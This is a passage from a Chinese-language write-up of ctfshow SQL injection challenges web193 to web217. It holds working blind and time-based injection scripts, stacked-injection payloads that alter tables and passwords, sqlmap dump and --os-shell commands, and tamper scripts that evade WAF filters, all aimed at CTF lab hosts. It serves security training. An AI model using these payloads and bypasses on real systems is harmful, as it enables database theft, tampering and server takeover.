information_schema.tables where table_schema=database()\u0026#34; 11 # 查字段 12 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_fl0g\u0026#39;\u0026#34; 13 # 查flag 14 payload = \u0026#34;select group_concat(f1ag) from ctfshow_flxg\u0026#34; 15 16 data={ 17 \u0026#39;username\u0026#39;:\u0026#34;admin\u0026#39; and if(({}) like \u0026#39;{}%\u0026#39;,1,2) =\u0026#39;1\u0026#34;.format(payload,result+j), 18 \u0026#39;password\u0026#39;:1 19 } 20 res = requests.post(url=url,data=data) 21 if \u0026#34;密码错误\u0026#34; == res.json()[\u0026#39;msg\u0026#39;]: 22 result += j 23 print(result) 24 break 25 if \u0026#34;}\u0026#34; in result: 26 exit(0) 我们可以用like来达到差不多的效果\n这题也可以用char,left,right,substring之类的方法\nweb194 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match(\u0026#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 新增waf：char|left|right|substring\n上题的方法依旧适用\nweb195 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;密码只能为数字\u0026#39;; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row[\u0026#39;pass\u0026#39;]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 17 } 18 19 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 20 if(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){ 21 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 22 die(json_encode($ret)); 23 } 24 25 if($row[0]==$password){ 26 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 27 } 根据提示堆叠注入\n其实就是在;后面再执行任意的sql命令\n这里直接改密码\npayload=\u0026#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;\u0026#34;\r# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围\rsql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\r# @Author:Y4tacker admin \u0026lt;=\u0026gt; 0x61646d696e\r111\u0026lt;=\u0026gt;0x313131 web196 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\r返回逻辑\r//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧\rif(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\rif(strlen($username)\u0026gt;16){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不能超过16个字符\u0026#39;;\rdie(json_encode($ret));\r}\rif($row[0]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;;\r}\r这题应该是bug了，select没被waf\n在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，$row[0] 指的是这一行数组中的第一个元素。\npayload:\n0;select(2)\r2 web197 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 9 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 10 if(\u0026#39;/\\*|\\#|\\-|\\x23|\\\u0026#39;|\\\u0026#34;|union|or|and|\\x26|\\x7c|file|into|select|update|set//i\u0026#39;, $username)){ 11 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 12 die(json_encode($ret)); 13 } 14 15 if($row[0]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 17 } 18 这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可\n比如\nusername: 1;show tables password: ctfshow_user 其他的一些骚操作\n重写ctfshow_user表\n把密码和id列互换之后爆密码（实际上在爆id）\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\u0026#34; 5for i in range(100): 6 if i == 0: 7 data = { 8 \u0026#39;username\u0026#39;: \u0026#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user \u0026#39; 9 \u0026#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` \u0026#39; 10 \u0026#39;varchar(255);\u0026#39;, 11 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 12 } 13 r = requests.post(url, data=data) 14 data = { 15 \u0026#39;username\u0026#39;: \u0026#39;0x61646d696e\u0026#39;, 16 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 17 } 18 r = requests.post(url, data=data) 19 if \u0026#34;登陆成功\u0026#34; in r.json()[\u0026#39;msg\u0026#39;]: 20 print(r.json()[\u0026#39;msg\u0026#39;]) 21 break web198 同web197\nweb199 通解一把梭\nweb200 通解一把梭\nweb190-web200通解 username=0;show tables;\rpass=ctfshow_user sqlmap的使用 web201 sqlmap最新版下载\r使用--user-agent 指定agent\r使用--referer 绕过referer检查 检测注入类型\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show\r爆数据库\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs\r爆表\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables 爆列\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns\r爆值\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web202 sqlmap最新版下载\r使用--data 调整sqlmap的请求方式 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 通过向命令行加入\u0026ndash;data参数转化请求方式为post\nsqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data \u0026#39;id=1\u0026#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web203 sqlmap最新版下载\r使用--method 调整sqlmap的请求方式 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} \u0026ndash;headers=\u0026ldquo;Content-Type: text/plain\u0026rdquo; 以表单形式发送\nsqlmap -u \u0026#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web204 使用--cookie 提交cookie数据 payload:\nsqlmap -u \u0026#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917\r6f63d87074e926a342a996872\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web205 api调用需要鉴权 通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php\npayload：\nsqlmap -u \u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=60prkqe8189934t5pv3ikepa16\u0026#34; --safe-url=\u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump web206 sql需要闭合 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\rsqlmap会自动构造闭合，所以跟前一题没什么区别\n但是也可以手动构造一下\npayload:\n根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=\u0026#34;)#\u0026#34;\r执行sqlmap命令行\rsqlmap -u \u0026#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;\u0026#34; --safe-url=\u0026#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; --dbs\rsqlmap -u \u0026#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;\u0026#34; --safe-url=\u0026#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; -D ctfshow_web --tables\rsqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --dbms=mysql -D \u0026#34;ctfshow_web\u0026#34; -T \u0026#34;ctfshow_flaxc\u0026#34; -C \u0026#34;flagv\u0026#34; --dump --headers=\u0026#34;Content-Type: text/plain\u0026#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 web207 Sqlmap Tamper 编写\n示例\n1#!/usr/bin/env python 2 3\u0026#34;\u0026#34;\u0026#34; 4Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) 5See the file \u0026#39;doc/COPYING\u0026#39; for copying permission 6\u0026#34;\u0026#34;\u0026#34; 7 8from lib.core.enums import PRIORITY 9__priority__ = PRIORITY.LOW # 当前脚本调用优先等级 10 11def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。 12 pass 13 14def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数 15 return payload 题目\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} 这里会将waf中的关键词替换成空格\n放一个Y4tacker大佬的脚本\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6# 假设在Python 3环境中运行，将xrange替换为range 7# 从lib.core.enums模块中导入PRIORITY枚举类型 8from lib.core.enums import PRIORITY 9 10# 设置脚本的优先级为低 11__priority__ = PRIORITY.LOW 12 13def tamper(payload, **kwargs): 14 \u0026#34;\u0026#34;\u0026#34; 15 篡改函数，调用space2comment函数对有效负载进行处理 16 :param payload: 待处理的有效负载 17 :param kwargs: 其他关键字参数 18 :return: 处理后的有效负载 19 \u0026#34;\u0026#34;\u0026#34; 20 payload = space2comment(payload) 21 return payload 22 23def space2comment(payload): 24 \u0026#34;\u0026#34;\u0026#34; 25 将有效负载中的空格字符替换为换行符 26 :param payload: 待处理的有效负载 27 :return: 处理后的有效负载 28 \u0026#34;\u0026#34;\u0026#34; 29 retVal = payload 30 if payload: 31 retVal = \u0026#34;\u0026#34; 32 # 用于跟踪是否在单引号内 33 quote = False 34 # 用于跟踪是否在双引号内 35 doublequote = False 36 # 用于跟踪是否遇到第一个空格 37 firstspace = False 38 39 for i in range(len(payload)): 40 if not firstspace: 41 if payload[i].isspace(): 42 firstspace = True 43 retVal += chr(0x0a) 44 continue 45 46 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 47 # 取反quote的值 48 quote = not quote 49 50 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 51 # 取反doublequote的值 52 doublequote = not doublequote 53 54 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 55 retVal += chr(0x0a) 56 continue 57 58 retVal += payload[i] 59 60 return retVal 其实这段代码的目的就是将payload中的空格替换成换行符\n其实直接用sqlmap自带的sapce2comment模板\nsqlmap -u \u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump web208 同上一题\nsqlmap -u \u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump web209 这题新增了点waf\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//TODO 未完工\rreturn preg_match(\u0026#39;/ |\\*|\\=/\u0026#39;, $str);\r} Y4tacker大佬的tamper\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6from lib.core.compat import xrange 7from lib.core.enums import PRIORITY 8 9__priority__ = PRIORITY.LOW 10 11 12def tamper(payload, **kwargs): 13 payload = space2comment(payload) 14 return payload 15 16 17def space2comment(payload): 18 retVal = payload 19 if payload: 20 retVal = \u0026#34;\u0026#34; 21 quote, doublequote, firstspace = False, False, False 22 23 for i in xrange(len(payload)): 24 if not firstspace: 25 if payload[i].isspace(): 26 firstspace = True 27 retVal += chr(0x0a) 28 continue 29 30 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 31 quote = not quote 32 33 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 34 doublequote = not doublequote 35 36 elif payload[i] == \u0026#34;*\u0026#34;: 37 retVal += chr(0x31) 38 continue 39 40 elif payload[i] == \u0026#34;=\u0026#34;: 41 retVal += chr(0x0a)+\u0026#39;like\u0026#39;+chr(0x0a) 42 continue 43 44 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 45 retVal += chr(0x0a) 46 continue 47 48 retVal += payload[i] 49 50 return retVal 其实也不用写这么复杂\n直接这样也ok的\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4 5__priority__ = PRIORITY.NORMAL 6 7def dependencies(): 8 pass 9 10 11def tamper(payload, **kwargs): 12 return payload.replace(\u0026#34;=\u0026#34;, \u0026#34; like \u0026#34;).replace(\u0026#34; \u0026#34;, chr(0x09)) payload:\npython sqlmap.py -u \u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump web210 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\r这题会对查询的字符进行两次的base64解密和两次的反转\n那我们只需要修改tamper，使传入的payload进行两次base64加密即可\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13 rev1 = payload[::-1].encode() 14 encode1 = base64.b64encode(rev1).decode() 15 rev2 = encode1[::-1].encode() 16 encode2 = base64.b64encode(rev2).decode() 17 return encode2 payload:\npython sqlmap.py -u \u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump web211 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} 增加了空格waf\n问题不大\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13\t14 payload0 = payload.replace(\u0026#34; \u0026#34;, chr(0x09)) 15 rev1 = payload0[::-1].encode() 16 encode1 = base64.b64encode(rev1).decode() 17 rev2 = encode1[::-1].encode() 18 encode2 = base64.b64encode(rev2).decode() 19 return encode2 payload\npython sqlmap.py -u \u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump web212 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} waf增加了*\n但是不影响上一题的tamper\npython sqlmap.py -u \u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump web213 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} 根据提示，用\u0026ndash;os-shell拿到shell读flag\n其他跟上题一样\npayload:\npython sqlmap.py -u \u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;\u0026#34; --referer=ctf.show --safe-url=\u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 --os-shell 时间盲注 web214 这道题没给出注入点\n主页找到select.js中，测试后发现ip为注入点\n1import requests 2 3url = \u0026#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web215 上题脚本改一改\n1import requests 2 3url = \u0026#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 # payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web216 构造闭合即可\n1import requests 2 3url = \u0026#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcc\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaac from ctfshow_flagxcc\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;\u0026#39;\u0026#39;) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web217 这题waf了sleep\n可以改用benchmark\n在 MySQL 中，benchmark函数用于测试表达式执行的性能。它的语法是benchmark(count,expr)，其中count是要执行expr的次数，expr是要测试的表达式。 例如，benchmark(10000000,sha(1))表示将sha(1)这个表达式执行 10000000 次。sha(1)是计算字符串'1'的 SHA - 1 哈希值。 1import requests 2import time 3 4url = \u0026#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 # 查数据库 18 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 19 # 查列名字 20 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxccb\u0026#39; limit 1,1\u0026#34; 21 # 查数据 22 payload = \u0026#34;select flagaabc from ctfshow_flagxccb\u0026#34; 23 data = { 24 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},benchmark(1000000,sha(1)),1)#\u0026#34;, 25 